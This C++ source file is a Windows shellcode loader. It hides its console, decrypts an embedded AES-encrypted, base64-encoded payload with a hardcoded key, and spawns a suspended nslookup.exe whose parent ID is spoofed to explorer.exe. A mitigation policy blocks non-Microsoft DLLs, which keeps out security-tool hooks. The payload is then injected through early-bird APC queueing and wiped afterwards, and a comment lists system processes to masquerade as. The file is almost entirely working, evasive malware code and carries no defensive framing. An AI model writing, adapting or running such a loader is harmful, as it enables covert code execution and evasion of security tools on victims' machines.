#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "aes.hpp"
#include "base64.h"
#include "low.h"

DWORD getNewPPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}


VOID inject(std::vector<byte> payload)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    HANDLE hProcess, hThread;
    DWORD pid;
    DWORD bytesWritten;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;

    // Initialize new Startup Info objects
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

    // Disallow non-microsoft DLL hooking:
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

    // Mask the PPID to explorer.exe
    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getNewPPID());
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);

    /* Good Process:
    - nslookup.exe
    - svchost.exe
    - mobsync.exe
    - dism.exe
    */
    LPCWSTR cmd = TEXT("C:\\Windows\\System32\\nslookup.exe");
    if (!CreateProcess(
        cmd,				// Executable
        NULL,				// Command line
        NULL,				// Process handle not inheritable
        NULL,				// Thread handle not inheritable
        FALSE,				// Set handle inheritance to FALSE
        EXTENDED_STARTUPINFO_PRESENT
        | CREATE_NO_WINDOW
        | CREATE_SUSPENDED,	// Creation Flags
        NULL,				// Use parent's environment block
        NULL,				// Use parent's starting directory 
        (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
        &pi					// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        DWORD errval = GetLastError();
        std::cout << "ERROR" << errval << std::endl;
    }

    WaitForSingleObject(pi.hProcess, 1500);
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    mem = nullptr;
    SIZE_T p_size = payload.size();
    NtAllocateVirtualMemory(hProcess, &mem, 0, (PULONG)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory(hProcess, mem, payload.data(), payload.size(), 0);
    NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
    NtResumeThread(hThread, NULL);

    Sleep(1500);
    uint8_t overwrite[500];
    NtWriteVirtualMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);

}


int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    std::vector<uint8_t> ciphertext, recovered;
    std::string shellcode, decoded;
    base64 b64 = base64();

    // Decode shellcode and load into uint8_t vector for decryption
    shellcode = "z33lrIYAG7pcIAZfrX7cRKLyNwr1w+zD1pSGQXA/0emhQBn2C1z5SjOjyGu5FL2Wrq3xADX+MDyaZs/F8BIBXcqPK1TFdESehzl8uO8+NT+Mda0BjZSGUcd0qs3PO4klwSOhSDrlTUhjCe9+7QoaFc8g0yTIGiAP674VA6URsKd9y0szNTBgSgn/L6gB2WpfGQ4UBaHGDiQ8GwrzedHh/eTbhZtS2/9HEoVqkoAqG2gts1rWt4ckzvEJRM8v4zJxLzMEtNnf3e9TBaG1CNfWCWg+SPIfW2L6SLUA16EadwzCbSP84dayBb1OlCu8yCNu9zHKR1wwqTLusIurPZ5MmapQRlG7I0JPV4Xkqa6gvwd/mGnBIsyn3Zj0jODzE6JwvHy6BGQtau9QMle7uBt+1w+Krc5r/ANboHeRnPBIDu5f6EoPtkvvusqvgig+XrKG9x8UrnMO01wzrcHVtA+0N93AFyFE3ElMrf2fcQuMLkzPj+P8qSDX37C8Y/StQkZcrsRkVzWRh4W5A1RtKqCzGcRhzxaMSzc7aTKdvYkmwK2VVo457PWIYjIgkHPXqBnwufws8Wz5okUSiRvfYqVMex0X+Ylk9B5iGPK4vyIiphM=";

    decoded = b64.base64_decode(shellcode);
    ciphertext.clear();
    std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));

    // AES Decryption Objects
    struct AES_ctx e_ctx;
    uint8_t iv[] = { 0x89,0x54,0x7f,0x64,0xc0,0xce,0x3a,0x44,0xf0,0xee,0xaf,0x1,0xa8,0xdc,0x6b,0x65 };
    uint8_t key[] = { 0x70,0x76,0x20,0xf2,0x3f,0x4c,0x4c,0x10,0x45,0xfb,0x50,0x93,0xd8,0xd1,0xc9,0xfb,0x6c,0x30,0x45,0x88,0xdd,0xb2,0xf4,0xaf,0x9c,0x1c,0x22,0x13,0x26,0x67,0x24,0xbd };
    AES_init_ctx_iv(&e_ctx, key, iv);

    // DECRYPT
    struct AES_ctx d_ctx;
    AES_init_ctx_iv(&d_ctx, key, iv);
    AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
    recovered.clear();

    // Remove the padding from the decypted plaintext
    for (int i = 0; i < ciphertext.size(); i++)
    {
        if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
        {
            break;
        }
        else
        {
            recovered.push_back(ciphertext[i]);
        }
    }

    inject(recovered);

    return 0;
}

